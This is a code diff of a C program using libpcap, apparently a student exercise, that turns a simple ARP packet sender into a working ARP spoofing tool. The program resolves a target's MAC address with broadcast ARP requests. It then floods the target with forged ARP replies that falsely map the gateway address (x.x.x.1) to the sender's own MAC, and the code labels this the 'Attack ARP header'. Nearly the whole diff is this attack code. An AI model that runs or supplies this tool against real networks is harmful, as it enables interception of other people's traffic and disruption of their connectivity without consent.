@@ -9,85 +9,33 @@
 #include <pcap.h>
 #include "sendarp_header.h"
 
-unsigned char sender_mac_address[6];
-unsigned char target_mac_address[6] = {0};
-const char arp_demo[] = "\x00\x01\x08\x00\x06\x04\x00\x02\xbc\x54\x51\xba\x34\x22\xc0\xa8" \
-                         "\x2b\x01\x98\x2c\xbc\x6d\x42\x8c\xc0\xa8\x2b\xea";
-
-int send_packet();
 void get_mac();
+void get_ip();
+int send_packet(int opcode);
+int get_packet();
+
+unsigned char sender_mac_address[7] = {0};
+unsigned char target_mac_address[7] = {0};
+unsigned char broadcast_mac_address[7] = {"\xff\xff\xff\xff\xff\xff"};
+unsigned char zero_mac_address[7] = {"\x00\x00\x00\x00\x00\x00"};
+
+unsigned char sender_ip[5] = {0}; 
+unsigned char target_ip[5] = {0};
+unsigned char arp_dummy[] = "\x00\x01\x08\x00\x06\x04";
+unsigned char arp_opcode_request[] = "\x00\x01";
+unsigned char arp_opcode_reply[] = "\x00\x02";
 
 int main()
 {
-    int j;
     get_mac();
-    for (j = 0; j < 6; ++j)
-        printf(" %02x", (unsigned char) sender_mac_address[j]);
-    putchar('\n');
-
-    send_packet();
+    get_ip();
+    
+	do
+		send_packet(1);
+	while (get_packet() != 0);
+	while(true) send_packet(2);
 }
 
-//interface,interface_name
-int send_packet(){
-    pcap_t *fp;
-    char errbuf[PCAP_ERRBUF_SIZE];
-    unsigned char packet[100];
-    int i;
-    pcap_if_t *d;
-    pcap_if_t *alldevs;
-
-    if(pcap_findalldevs(&alldevs, errbuf) == -1){
-        fprintf(stderr, "Error in pcap_findalldevs :%s\n", errbuf);
-        exit(1);
-    }
-
-    for (d=alldevs;d;d=d->next)
-    {
-        printf("%d. %s", ++i, d->name);
-    if(d->description)
-        printf("(%s)\n",d->description);
-    else
-        printf("(No description Available)\n");
-    }
-    d = alldevs;
-
-
-    /* Open the output device */
-    if ( (fp= pcap_open_live(d->name,     		// name of the device(interface_name)
-                        100,                // portion of the packet to capture (only the first 100 bytes)
-                        0, 					//PCAP_OPENFLAG_PROMISCUOUS
-                        1000,               // read timeout
-                        errbuf              // error buffer
-                        ) ) == NULL)
-    {
-        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
-        return -1;
-    }
-
-    /* Make ethernet header */
-    int pointer = 0;
-    memcpy(packet + pointer, target_mac_address, 6);
-    memcpy(packet + pointer + 6, sender_mac_address, 6);
-    memcpy(packet + pointer + 12, "\x08\x06", 2);
-
-    /* Make ARP header */
-    pointer += 14;
-    memcpy(packet + pointer, arp_demo, 28);
-    for(i=29;i<100;i++)
-    {
-        packet[i]=i%256;
-    }
-
-    /* Send down the packet */
-    if (pcap_sendpacket(fp, packet, 100 /* size */) != 0)
-    {
-        fprintf(stderr,"\nError sending the packet:  \n", pcap_geterr(fp));
-        return 1;
-    }
-
-    return 0;
-}
 
 void get_mac(){
     struct ifreq s;
@@ -96,9 +44,114 @@ void get_mac(){
     strcpy(s.ifr_name, "ens33");
     if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
 
-    memcpy(sender_mac_address, s.ifr_addr.sa_data, 6);
+    memmove(sender_mac_address, s.ifr_addr.sa_data, 6);
 
-    //for (int i = 0; i < 6; ++i)
-    //  printf(" %02x", (unsigned char) sender_mac_address[i]);
+    for (int i = 0; i < 6; ++i)
+      printf("%02x ", (unsigned char) sender_mac_address[i]);
+	putchar('\n');
   }
 }
+
+void get_ip(){
+	unsigned char ip[4];
+	printf("sender ip : ");
+	scanf("%hhu.%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2], &ip[3]);
+	memmove(sender_ip,ip,4);
+	
+	printf("target ip : ");
+	scanf("%hhu.%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2], &ip[3]);
+	memmove(target_ip,ip,4);
+}
+
+int send_packet(int opcode){
+    pcap_t *fp;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    unsigned char packet[200]={0};
+	int pointer ;
+
+    /* Open the output device */
+    if ( (fp= pcap_open_live("ens33",     	// name of the device(interface_name)
+                        100,                // portion of the packet to capture (only the first 100 bytes)
+                        1, 					// PCAP_OPENFLAG_PROMISCUOUS
+                        1000,               // read timeout
+                        errbuf              // error buffer
+                        ) ) == NULL)
+    {
+        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", "ens33");
+        return -1;
+    }
+    
+	pointer = 0;
+	switch(opcode)
+	{
+		case 1:
+    		/* Make ethernet header */
+    		memmove(packet, broadcast_mac_address, 6);
+    		memmove(packet + 6, sender_mac_address, 6);
+    		memmove(packet + 12, "\x08\x06", 2);
+			pointer += 14;
+
+			/* Make Normal ARP header */
+			memmove(packet + pointer, arp_dummy, 6);
+			memmove(packet + pointer + 6, arp_opcode_request, 2);
+    		memmove(packet + pointer + 8, sender_mac_address, 6);
+			memmove(packet + pointer + 14, sender_ip, 4);
+    		memmove(packet + pointer + 18, zero_mac_address, 6);
+			memmove(packet + pointer + 24, target_ip, 4);
+			break;
+
+		case 2:
+			/* Make ethernet header */
+    		memmove(packet, target_mac_address, 6);
+    		memmove(packet + 6, sender_mac_address, 6);
+    		memmove(packet + 12, "\x08\x06", 2);
+			pointer += 14;
+
+			/* Make Attack ARP header */
+			memmove(packet + pointer, arp_dummy, 6);
+			memmove(packet + pointer + 6, arp_opcode_reply, 2);
+    		memmove(packet + pointer + 8, sender_mac_address, 6);
+			memmove(packet + pointer + 14, sender_ip, 3);
+			memmove(packet + pointer + 17, "\x01", 1); 				// supposed router has X.X.X.1 address.
+    		memmove(packet + pointer + 18, target_mac_address, 6);
+			memmove(packet + pointer + 24, target_ip, 4);
+			break;
+	}
+
+    /* Send down the packet */
+    if (pcap_sendpacket(fp, packet, 42 /* size */) != 0)
+    {
+        fprintf(stderr,"\nError sending the packet: %s \n", pcap_geterr(fp));
+        return 1;
+    }
+	printf("packet send!\n");
+    return 0;
+}
+
+int get_packet(){
+	const char *dev = "ens33";
+  	char errbuf[PCAP_ERRBUF_SIZE];
+  	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+  	if (handle == NULL) {
+    	fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+    	return -1;
+ 		}
+	printf("1");
+	int i = 0;
+	while (i <5) {
+    	struct pcap_pkthdr* header;
+    	const u_char* packet;
+    	int res = pcap_next_ex(handle, &header, &packet);
+    	if (res == 0) return 1;
+    	if (res == -1 || res == -2) return 1;
+
+		if(!memcmp(target_ip, packet + 28, 4)){
+			memmove(target_mac_address,packet+22,6); 		// packet + 22 = target_mac_address
+			printf("Gotcha! I Got the target mac addr.\n");
+			return 0;
+			}
+		i++;
+		}
+	return 1;
+}
+
